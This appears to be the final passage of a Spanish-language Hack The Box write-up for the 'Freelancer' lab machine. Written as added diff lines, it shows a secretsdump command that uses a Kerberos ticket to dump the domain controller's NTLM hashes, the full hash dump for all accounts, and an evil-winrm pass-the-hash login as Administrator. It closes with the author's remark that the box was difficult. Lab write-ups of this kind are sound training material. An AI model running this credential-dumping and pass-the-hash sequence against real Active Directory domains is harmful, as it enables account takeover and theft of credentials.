+vale despues de darle muchas vueltas
+export KRB5CCNAME='Administrator.ccache'
+secretsdump.py 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.129.x.x -target-ip 10.129.x.x -just-dc-ntlm
+
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
+freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
+sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
+SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
+sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
+freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
+freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
+freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
+freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
+DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::
+DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::
+WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::
+WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
+WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
+DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
+SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
+yo$:12102:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
+
+
+evil-winrm -i 10.129.x.x -u Administrator -H 0039318f1e8274633445bce32ad1a290
+
+y acabamos por fin
+
+Una máquina muy complicada, necesité mucha ayuda y no pasé la parte de sacar el proceso del DMP, pero incluso
+la escalada de privilegios en AD fue una locura
